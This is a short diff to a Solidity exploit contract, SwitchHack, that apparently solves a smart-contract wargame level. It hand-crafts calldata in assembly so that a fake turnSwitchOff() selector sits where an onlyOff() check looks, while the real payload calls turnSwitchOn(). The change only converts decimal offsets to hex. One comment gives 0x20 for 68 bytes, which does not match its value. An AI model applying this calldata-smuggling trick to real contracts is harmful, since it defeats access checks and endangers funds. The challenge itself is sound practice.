@@ -42,20 +42,20 @@ contract SwitchHack {
 
         assembly {
             // flipSwitch()
-            mstore(0, hex"30c13ade")
+            mstore(0x00, hex"30c13ade")
             // data part for `_data` starts at argument block's 68 bytes (0x20)
-            mstore(4, 68)
+            mstore(0x04, 0x44)
             // leave empty bytes
-            mstore(36, 0)
+            mstore(0x24, 0x00)
             // turnSwitchOff() selector to satisfy onlyOff() modifier
-            mstore(68, hex"20606e15")
+            mstore(0x44, hex"20606e15")
             // data part for `_data` starts here. first 32 bytes is length - 0x04
-            mstore(72, 4)
+            mstore(0x48, 0x04)
             // next 4 bytes is the bytes data itself - function selector for turnSwitchOn()
-            mstore(104, hex"76227e12")
+            mstore(0x68, hex"76227e12")
 
             // call _switch.flipSwitch()
-            if iszero(call(gas(), _switch, 0, 0, 126, 0, 0)) {
+            if iszero(call(gas(), _switch, 0, 0, 0x7e, 0, 0)) {
                 revert(0, 0)
             }
         }
